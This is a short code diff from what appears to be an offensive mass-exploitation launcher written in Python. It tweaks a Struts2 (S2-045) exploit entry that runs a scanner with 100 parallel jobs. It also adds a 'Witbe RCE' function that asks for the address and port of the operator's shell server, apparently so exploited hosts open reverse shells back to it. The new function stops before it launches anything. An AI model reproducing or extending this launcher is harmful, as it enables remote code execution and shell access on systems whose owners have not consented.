@@ -246,7 +246,7 @@ def s2_045():
     exploit = 's2_045_cmd.py'
     work_path = '/structs2/'
     exec_path = exploit
-    custom_args = ('-p ' + port).split()
+    custom_args = str('-p ' + port).split()
     jobs = 100
 
     print(
@@ -258,6 +258,23 @@ def s2_045():
     # start scanner
     scanner_args = (exploit, work_path, exec_path, custom_args, jobs)
     scanner(scanner_args)
+
+
+def witbe():
+    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)
+
+    # shell server config
+    rhost = str(input('[?] IP of your shell server: ')).strip()
+    rport = str(input('[?] and Port? ')).strip()
+
+    # exploit config
+    exploit = 'witbe.py'
+    work_path = '/witbe/'
+    exec_path = exploit
+    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
+    jobs = 50
+
+    
 
 
 def attack():
